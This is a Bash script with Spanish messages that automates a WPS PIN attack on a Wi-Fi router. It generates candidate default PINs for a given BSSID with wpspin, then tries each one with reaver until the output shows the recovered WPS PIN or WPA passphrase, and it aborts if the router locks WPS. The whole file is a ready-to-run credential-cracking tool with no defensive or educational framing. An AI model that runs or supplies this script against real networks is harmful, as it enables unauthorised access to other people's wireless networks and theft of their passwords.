#!/bin/bash

# Comprobar argumentos
if [ "$#" -ne 3 ]; then
    echo "Uso: $0 <BSSID> <CANAL> <INTERFAZ_MON>"
    echo "Ejemplo: sudo $0 60:38:E0:A2:3D:2A 1 mon0"
    exit 1
fi

BSSID="$1"
CHANNEL="$2"
IFACE="$3"

echo "[*] BSSID    : $BSSID"
echo "[*] Canal    : $CHANNEL"
echo "[*] Interfaz : $IFACE"
echo

echo "[*] Generando PINs con wpspin..."
echo

# Generar PINs
PINS=$(wpspin -A "$BSSID" | grep -Eo '[0-9]{8}' | sort -u)

if [ -z "$PINS" ]; then
    echo "[!] No se generaron PINs"
    exit 1
fi

echo "[*] PINs generados:"
echo "$PINS"
echo

# Probar PINs
for PIN in $PINS; do
    echo "[*] Probando PIN: $PIN"

    OUTPUT=$(sudo reaver \
        --max-attempts=1 \
        -l 100 \
        -r 3:45 \
        -i "$IFACE" \
        -b "$BSSID" \
        -c "$CHANNEL" \
        -p "$PIN" 2>&1)

    echo "$OUTPUT"

    # Detectar PIN correcto
    if echo "$OUTPUT" | grep -qiE "WPS PIN:|WPA PSK:|AP SSID:"; then
        echo
        echo "[✓] ¡PIN CORRECTO ENCONTRADO!"
        echo "[✓] PIN: $PIN"
        echo "[✓] Deteniendo ejecución"
        exit 0
    fi

    # Detectar WPS lock
    if echo "$OUTPUT" | grep -qi "rate limiting"; then
        echo "[!] WPS LOCK DETECTADO — abortando"
        exit 1
    fi

    echo "------------------------------------"
done

echo "[✗] Ningún PIN fue válido"
